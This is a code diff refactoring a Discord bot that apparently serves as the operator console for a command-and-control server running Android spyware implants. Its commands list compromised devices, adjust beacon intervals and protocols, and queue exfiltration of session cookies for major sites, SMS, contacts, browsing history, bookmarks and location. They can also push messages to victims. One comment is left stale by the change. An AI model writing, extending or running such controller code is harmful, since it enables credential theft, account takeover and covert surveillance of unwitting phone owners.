@@ -7,6 +7,7 @@ Commands are forwarded to the C2 server via HTTP. If the server is
 offline, the bot falls back to standalone/demo mode.
 """
 
+import json
 import logging
 from typing import Any
 
@@ -61,26 +62,33 @@ _COLOR_NO_DATA = 0x99AAB5   # gray   — no data / unreachable
 # ---------------------------------------------------------------------------
 
 _TASK_EMOJIS: dict[str, str] = {
-    "request-cookies":   "🍪",
-    "request-history":   "📜",
+    "request-cookies": "🍪",
+    "request-history": "📜",
     "request-bookmarks": "🔖",
-    "request-contacts":  "👤",
-    "request-sms":       "💬",
-    "request-location":  "📍",
+    "request-contacts": "👤",
+    "request-sms": "💬",
+    "request-location": "📍",
+    "send-notification": "✉️",
 }
 
-_HIGH_VALUE_COOKIE_DOMAINS = (
-    "https://www.google.com,"
-    "https://accounts.google.com,"
-    "https://www.facebook.com,"
-    "https://www.amazon.com,"
-    "https://twitter.com,"
-    "https://www.instagram.com,"
-    "https://www.reddit.com,"
-    "https://github.com,"
-    "https://www.linkedin.com,"
-    "https://www.netflix.com"
-)
+# Comma-separated string because the Android handler splits on "," to query each domain.
+_HIGH_VALUE_COOKIE_DOMAINS: list[str] = [
+    "https://www.google.com",
+    "https://accounts.google.com",
+    "https://www.facebook.com",
+    "https://www.amazon.com",
+    "https://twitter.com",
+    "https://www.instagram.com",
+    "https://www.reddit.com",
+    "https://github.com",
+    "https://www.linkedin.com",
+    "https://www.netflix.com",
+]
+
+
+def _fmt_timestamp(raw: str | None) -> str:
+    """Trim an ISO timestamp to 'YYYY-MM-DD HH:MM' for compact Discord display."""
+    return (raw or "")[:16].replace("T", " ")
 
 # ---------------------------------------------------------------------------
 # HTTP bridge to C2 server
@@ -152,7 +160,7 @@ def format_server_devices(data: dict[str, Any]) -> discord.Embed:
         status = "🟢" if d.get("status") == "online" else "🔴"
         badges = (" 🤖" if d.get("is_emulator") else "") + (" 🔓" if d.get("is_rooted") else "")
         carrier = f" · {d['carrier']}" if d.get("carrier") else ""
-        last_seen = (d.get("last_seen") or "")[:16].replace("T", " ")
+        last_seen = _fmt_timestamp(d.get("last_seen"))
         embed.add_field(
             name=f"{status} {d['name']}{badges}",
             value=f"`{d['ip']}`{carrier}\nlast seen `{last_seen}`",
@@ -195,7 +203,7 @@ def format_cached_for_task(
     embed = discord.Embed(title=f"{emoji} {task_type}", color=_COLOR_SUCCESS)
     for dev, latest in relevant.items():
         status_icon = "✅" if latest.get("success") else "❌"
-        received = (latest.get("received_at") or "")[:16].replace("T", " ")
+        received = _fmt_timestamp(latest.get("received_at"))
         output = str(latest.get("data", {}).get("output", ""))
         lines = output.split("\n")
         preview = "\n".join(lines[:8])[:800]
@@ -235,7 +243,7 @@ def format_server_results(data: dict[str, Any]) -> discord.Embed:
             emoji = _TASK_EMOJIS.get(task_type, "📄")
             latest = history[0]
             status_icon = "✅" if latest.get("success") else "❌"
-            received = (latest.get("received_at") or "")[:16].replace("T", " ")
+            received = _fmt_timestamp(latest.get("received_at"))
             count_label = f" (+{len(history) - 1})" if len(history) > 1 else ""
             lines.append(f"{emoji} `{task_type}` {status_icon} `{received}`{count_label}")
         if lines:
@@ -259,6 +267,25 @@ def format_server_simple(data: dict[str, Any]) -> discord.Embed:
 def _wrap_standalone(text: str) -> discord.Embed:
     """Wrap a standalone/fallback text response in a neutral embed."""
     return discord.Embed(description=text, color=_COLOR_NO_DATA)
+
+
+def format_device_info(data: dict[str, Any]) -> discord.Embed:
+    """Format a /admin/device-info response as a Discord embed."""
+    d = data.get("data", {})
+    is_online = d.get("status") == "online"
+    badges = (" 🤖" if d.get("is_emulator") else "") + (" 🔓" if d.get("is_rooted") else "")
+    embed = discord.Embed(
+        title=f"📱 {d.get('name')}{badges}",
+        color=_COLOR_SUCCESS if is_online else _COLOR_ERROR,
+    )
+    status_icon = '🟢' if is_online else '🔴'
+    embed.add_field(name="Status", value=f"{status_icon} {d.get('status')}", inline=True)
+    embed.add_field(name="IP", value=f"`{d.get('ip')}`", inline=True)
+    embed.add_field(name="OS", value=f"`{d.get('os_info', 'unknown')}`", inline=True)
+    embed.add_field(name="Carrier", value=f"`{d.get('carrier', 'unknown')}`", inline=True)
+    embed.add_field(name="Apps", value=f"`{d.get('installed_apps_count', 0)}`", inline=True)
+    embed.add_field(name="Last seen", value=f"`{_fmt_timestamp(d.get('last_seen'))}`", inline=True)
+    return embed
 
 
 # ---------------------------------------------------------------------------
@@ -304,6 +331,24 @@ def log_access_denied(interaction: discord.Interaction, command_name: str) -> No
         user,
         user.id,
     )
+
+
+async def _deny_if_not_admin(
+    interaction: discord.Interaction,
+    command_name: str,
+) -> bool:
+    """Send an ephemeral denial and return True if the user is not the admin.
+
+    Usage: if await _deny_if_not_admin(interaction, "command-name"): return
+    """
+    if is_admin_user(interaction):
+        return False
+    log_access_denied(interaction, command_name)
+    await interaction.response.send_message(
+        "🚫 **Access denied.** You are not authorised to use this bot.",
+        ephemeral=True,
+    )
+    return True
 
 
 async def _handle_request_command(
@@ -403,14 +448,8 @@ async def protocol_autocomplete(
 )
 async def show_devices(interaction: discord.Interaction) -> None:
     """Send the list of managed devices to the channel."""
-    if not is_admin_user(interaction):
-        log_access_denied(interaction, "show-devices")
-        await interaction.response.send_message(
-            "🚫 **Access denied.** You are not authorised to use this bot.",
-            ephemeral=True,
-        )
+    if await _deny_if_not_admin(interaction, "show-devices"):
         return
-
     log_command(interaction, "show-devices")
 
     server_response = await call_server("/admin/devices")
@@ -429,39 +468,19 @@ async def show_devices(interaction: discord.Interaction) -> None:
 @app_commands.describe(device="Device name (e.g. POCO_F5)")
 async def device_info(interaction: discord.Interaction, device: str) -> None:
     """Display rich fingerprint data for the requested device."""
-    if not is_admin_user(interaction):
-        log_access_denied(interaction, "device-info")
-        await interaction.response.send_message(
-            "🚫 **Access denied.** You are not authorised to use this bot.",
-            ephemeral=True,
-        )
+    if await _deny_if_not_admin(interaction, "device-info"):
         return
-
     log_command(interaction, "device-info", f"device={device}")
 
     server_response = await call_server(f"/admin/device-info/{device}")
-    if server_response:
-        d = server_response.get("data", {})
-        is_online = d.get("status") == "online"
-        badges = (" 🤖" if d.get("is_emulator") else "") + (" 🔓" if d.get("is_rooted") else "")
-        embed = discord.Embed(
-            title=f"📱 {d.get('name')}{badges}",
-            color=_COLOR_SUCCESS if is_online else _COLOR_ERROR,
-        )
-        status_val = f"{'🟢' if is_online else '🔴'} {d.get('status')}"
-        embed.add_field(name="Status", value=status_val, inline=True)
-        embed.add_field(name="IP", value=f"`{d.get('ip')}`", inline=True)
-        embed.add_field(name="OS", value=f"`{d.get('os_info', 'unknown')}`", inline=True)
-        embed.add_field(name="Carrier", value=f"`{d.get('carrier', 'unknown')}`", inline=True)
-        embed.add_field(name="Apps", value=f"`{d.get('installed_apps_count', 0)}`", inline=True)
-        last_seen = (d.get("last_seen") or "")[:16].replace("T", " ")
-        embed.add_field(name="Last seen", value=f"`{last_seen}`", inline=True)
-    else:
-        embed = discord.Embed(
+    embed = (
+        format_device_info(server_response)
+        if server_response
+        else discord.Embed(
             description=f"❌ Could not retrieve device info for `{device}`.",
             color=_COLOR_ERROR,
         )
-
+    )
     await interaction.response.send_message(embed=embed)
 
 
@@ -476,14 +495,8 @@ async def set_beacon_interval(
     interval: int,
 ) -> None:
     """Set the beacon interval to the provided value."""
-    if not is_admin_user(interaction):
-        log_access_denied(interaction, "set-beacon-interval")
-        await interaction.response.send_message(
-            "🚫 **Access denied.** You are not authorised to use this bot.",
-            ephemeral=True,
-        )
+    if await _deny_if_not_admin(interaction, "set-beacon-interval"):
         return
-
     log_command(interaction, "set-beacon-interval", f"interval={interval}")
 
     server_response = await call_server(
@@ -508,14 +521,8 @@ async def set_communication_protocol(
     protocol: str,
 ) -> None:
     """Set the communication protocol to the provided value."""
-    if not is_admin_user(interaction):
-        log_access_denied(interaction, "set-communication-protocol")
-        await interaction.response.send_message(
-            "🚫 **Access denied.** You are not authorised to use this bot.",
-            ephemeral=True,
-        )
+    if await _deny_if_not_admin(interaction, "set-communication-protocol"):
         return
-
     log_command(interaction, "set-communication-protocol", f"protocol={protocol}")
 
     server_response = await call_server(
@@ -541,16 +548,12 @@ async def request_cookies(
     device: str = "*",
 ) -> None:
     """Show cached cookies and queue a fresh exfiltration task."""
-    if not is_admin_user(interaction):
-        log_access_denied(interaction, "request-cookies")
-        await interaction.response.send_message(
-            "🚫 **Access denied.** You are not authorised to use this bot.",
-            ephemeral=True,
-        )
+    if await _deny_if_not_admin(interaction, "request-cookies"):
         return
     log_command(interaction, "request-cookies", f"device={device}")
     await _handle_request_command(
-        interaction, "request-cookies", device, {"domains": _HIGH_VALUE_COOKIE_DOMAINS}
+        interaction, "request-cookies", device,
+        {"domains": ",".join(_HIGH_VALUE_COOKIE_DOMAINS)},
     )
 
 
@@ -564,12 +567,7 @@ async def request_history(
     device: str = "*",
 ) -> None:
     """Show cached history and queue a fresh exfiltration task."""
-    if not is_admin_user(interaction):
-        log_access_denied(interaction, "request-history")
-        await interaction.response.send_message(
-            "🚫 **Access denied.** You are not authorised to use this bot.",
-            ephemeral=True,
-        )
+    if await _deny_if_not_admin(interaction, "request-history"):
         return
     log_command(interaction, "request-history", f"device={device}")
     await _handle_request_command(interaction, "request-history", device)
@@ -585,12 +583,7 @@ async def request_bookmarks(
     device: str = "*",
 ) -> None:
     """Show cached bookmarks and queue a fresh exfiltration task."""
-    if not is_admin_user(interaction):
-        log_access_denied(interaction, "request-bookmarks")
-        await interaction.response.send_message(
-            "🚫 **Access denied.** You are not authorised to use this bot.",
-            ephemeral=True,
-        )
+    if await _deny_if_not_admin(interaction, "request-bookmarks"):
         return
     log_command(interaction, "request-bookmarks", f"device={device}")
     await _handle_request_command(interaction, "request-bookmarks", device)
@@ -606,12 +599,7 @@ async def request_sms(
     device: str = "*",
 ) -> None:
     """Show cached SMS and queue a fresh exfiltration task. Requires READ_SMS on device."""
-    if not is_admin_user(interaction):
-        log_access_denied(interaction, "request-sms")
-        await interaction.response.send_message(
-            "🚫 **Access denied.** You are not authorised to use this bot.",
-            ephemeral=True,
-        )
+    if await _deny_if_not_admin(interaction, "request-sms"):
         return
     log_command(interaction, "request-sms", f"device={device}")
     await _handle_request_command(interaction, "request-sms", device)
@@ -627,12 +615,7 @@ async def request_location(
     device: str = "*",
 ) -> None:
     """Show cached location and queue a fresh poll (cached GPS fix, no active tracking)."""
-    if not is_admin_user(interaction):
-        log_access_denied(interaction, "request-location")
-        await interaction.response.send_message(
-            "🚫 **Access denied.** You are not authorised to use this bot.",
-            ephemeral=True,
-        )
+    if await _deny_if_not_admin(interaction, "request-location"):
         return
     log_command(interaction, "request-location", f"device={device}")
     await _handle_request_command(interaction, "request-location", device)
@@ -652,12 +635,7 @@ async def send_message(
     device: str = "*",
 ) -> None:
     """Queue a send-notification task so the beacon displays a message to the end user."""
-    if not is_admin_user(interaction):
-        log_access_denied(interaction, "send-message")
-        await interaction.response.send_message(
-            "🚫 **Access denied.** You are not authorised to use this bot.",
-            ephemeral=True,
-        )
+    if await _deny_if_not_admin(interaction, "send-message"):
         return
     log_command(interaction, "send-message", f"device={device} message={message!r}")
 
@@ -700,12 +678,7 @@ async def request_contacts(
     device: str = "*",
 ) -> None:
     """Show cached contacts and queue a fresh exfiltration task. Requires READ_CONTACTS."""
-    if not is_admin_user(interaction):
-        log_access_denied(interaction, "request-contacts")
-        await interaction.response.send_message(
-            "🚫 **Access denied.** You are not authorised to use this bot.",
-            ephemeral=True,
-        )
+    if await _deny_if_not_admin(interaction, "request-contacts"):
         return
     log_command(interaction, "request-contacts", f"device={device}")
     await _handle_request_command(interaction, "request-contacts", device)
@@ -722,6 +695,7 @@ VALID_TASK_TYPES = [
     "request-contacts",
     "request-sms",
     "request-location",
+    "send-notification",
 ]
 
 
@@ -774,17 +748,9 @@ async def queue_task(
     parameters: str = "{}",
 ) -> None:
     """Queue a C2 task for a target device via the server."""
-    if not is_admin_user(interaction):
-        log_access_denied(interaction, "queue-task")
-        await interaction.response.send_message(
-            "🚫 **Access denied.** You are not authorised to use this bot.",
-            ephemeral=True,
-        )
+    if await _deny_if_not_admin(interaction, "queue-task"):
         return
-
     log_command(interaction, "queue-task", f"device={device}, type={task_type}")
-
-    import json
     try:
         params = json.loads(parameters)
     except json.JSONDecodeError:
@@ -820,14 +786,8 @@ async def queue_task(
 )
 async def show_results(interaction: discord.Interaction) -> None:
     """Display the most recent task result per type per device."""
-    if not is_admin_user(interaction):
-        log_access_denied(interaction, "show-results")
-        await interaction.response.send_message(
-            "🚫 **Access denied.** You are not authorised to use this bot.",
-            ephemeral=True,
-        )
+    if await _deny_if_not_admin(interaction, "show-results"):
         return
-
     log_command(interaction, "show-results")
 
     server_response = await call_server("/admin/results")
@@ -848,14 +808,8 @@ async def show_results(interaction: discord.Interaction) -> None:
 )
 async def pending_tasks(interaction: discord.Interaction) -> None:
     """Show pending task counts per device."""
-    if not is_admin_user(interaction):
-        log_access_denied(interaction, "pending-tasks")
-        await interaction.response.send_message(
-            "🚫 **Access denied.** You are not authorised to use this bot.",
-            ephemeral=True,
-        )
+    if await _deny_if_not_admin(interaction, "pending-tasks"):
         return
-
     log_command(interaction, "pending-tasks")
 
     server_response = await call_server("/admin/pending-tasks")
